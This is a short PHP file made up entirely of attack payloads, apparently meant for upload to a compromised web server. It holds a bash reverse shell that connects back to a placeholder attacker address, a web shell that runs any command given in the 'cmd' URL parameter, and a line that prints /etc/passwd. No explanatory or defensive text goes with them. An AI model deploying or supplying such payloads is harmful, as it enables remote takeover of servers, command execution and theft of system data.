<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'");
?>
<? echo system($_GET['cmd']); ?>
<? echo file_get_contents('/etc/passwd'); ?>
